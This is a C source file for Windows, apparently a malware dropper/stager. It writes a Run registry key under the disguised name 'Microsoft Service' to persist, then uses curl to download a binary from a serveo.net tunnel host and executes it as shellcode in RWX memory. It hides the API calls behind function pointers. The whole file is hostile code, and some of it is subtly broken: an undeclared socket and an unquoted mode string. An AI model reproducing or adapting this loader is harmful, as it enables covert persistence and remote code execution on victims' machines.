// By HaxL0p4 ;)

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>


int bootRun() {
    char err[128] = "Failed\n";
    char suc[128] = "Created Persistence At : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
    TCHAR szPath[MAX_PATH];
    DWORD pathLen = 0;

    pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
    if (pathLen == 0) {
        send(sock, err, sizeof(err), 0);
        return -1;
    }

    HKEY NewVal;

    if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
        send(sock, err, sizeof(err), 0);
        return -1;
    }

    DWORD pathLenInBytes = pathLen * sizeof(*szPath);
    if (RegSetValueEx(NewVal, TEXT("Microsoft Service"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
        RegCloseKey(NewVal);
        send(sock, err, sizeof(err), 0);
        return -1;
    }
    RegCloseKey(NewVal);
    send(sock, suc, sizeof(suc), 0);
    return 0;
}

int main() {
    
    bootRun();

    start:
    FILE *(*f1)(const char *, const char *) = popen;
    size_t (*f2)(void *, size_t, size_t, FILE *) = fread;
    int (*f3)(FILE *) = pclose;
    void *(*f4)(LPVOID, SIZE_T, DWORD, DWORD) = VirtualAlloc;
    void *(*f5)(void *, const void *, size_t) = memcpy;

    FILE *fpipe;
    char *command = "curl https://loki.serveo.net/code.bin";
    char c = 0;
    unsigned char code[460];
    int counter = 0;


    while(0 == (fpipe = (FILE*)f1(command, r))) {
        Sleep(10);
        goto start;
    }

    while (f2(&c, sizeof c, 1, fpipe)) {
        code[counter] = c;
        counter = counter + 1;
    }

    f3(fpipe);

    void *exec = f4(0, sizeof code, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    f5(exec, code, sizeof code);
    ((void(*)())exec)();
    return 0;
}
